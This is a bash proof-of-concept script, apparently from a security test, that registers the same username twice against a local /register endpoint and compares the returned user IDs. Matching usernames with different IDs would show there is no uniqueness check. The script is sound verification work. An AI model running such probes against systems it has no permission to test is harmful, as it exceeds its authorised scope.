#!/bin/bash

# POC: Duplicate User Registration Vulnerability
# Demonstrates that multiple accounts can be created with identical usernames

TARGET_URL="http://localhost:3000"
TEST_USERNAME="poc_duplicate_test_$(date +%s)"
TEST_PASSWORD="TestPassword123"

echo "=========================================="
echo "Duplicate Username Registration POC"
echo "=========================================="
echo ""

# Test 1: Register first instance of the username
echo "[*] Attempting first registration with username: $TEST_USERNAME"
RESPONSE1=$(curl -s -X POST "${TARGET_URL}/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${TEST_USERNAME}&password=${TEST_PASSWORD}")

echo "[+] First Registration Response:"
echo "$RESPONSE1"
echo ""

# Extract first user ID and user number
USER_ID_1=$(echo "$RESPONSE1" | grep -oP '"userId":\s*"?\K[^"}\s]+' | head -1)
USER_NUMBER_1=$(echo "$RESPONSE1" | grep -oP '"userNumber":\s*"?\K[^"}\s]+' | head -1)

echo "[+] First Registration Details:"
echo "    User ID: $USER_ID_1"
echo "    User Number: $USER_NUMBER_1"
echo ""

# Test 2: Register the same username again
echo "[*] Attempting second registration with SAME username: $TEST_USERNAME"
RESPONSE2=$(curl -s -X POST "${TARGET_URL}/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=${TEST_USERNAME}&password=${TEST_PASSWORD}")

echo "[+] Second Registration Response:"
echo "$RESPONSE2"
echo ""

# Extract second user ID and user number
USER_ID_2=$(echo "$RESPONSE2" | grep -oP '"userId":\s*"?\K[^"}\s]+' | head -1)
USER_NUMBER_2=$(echo "$RESPONSE2" | grep -oP '"userNumber":\s*"?\K[^"}\s]+' | head -1)

echo "[+] Second Registration Details:"
echo "    User ID: $USER_ID_2"
echo "    User Number: $USER_NUMBER_2"
echo ""

# Vulnerability Check
echo "=========================================="
echo "VULNERABILITY VERIFICATION"
echo "=========================================="

if [ -z "$USER_ID_1" ] || [ -z "$USER_ID_2" ]; then
    echo "[-] ERROR: Could not extract user IDs from responses"
    echo "    This may indicate the endpoint is not responding correctly"
    exit 1
fi

if [ "$USER_ID_1" != "$USER_ID_2" ]; then
    echo "[!] VULNERABILITY CONFIRMED!"
    echo "[!] Same username registered with DIFFERENT user IDs:"
    echo "    First registration:  User ID: $USER_ID_1, User Number: $USER_NUMBER_1"
    echo "    Second registration: User ID: $USER_ID_2, User Number: $USER_NUMBER_2"
    echo ""
    echo "[!] This proves that:"
    echo "    1. No unique constraint exists on the username field"
    echo "    2. Multiple accounts with identical usernames were created"
    echo "    3. Each has a separate MongoDB ObjectID and user number"
    echo "    4. Authentication logic will be ambiguous for this username"
    exit 0
else
    echo "[-] Second registration returned same user ID as first"
    echo "    Vulnerability may not be present or behavior is different"
    exit 1
fi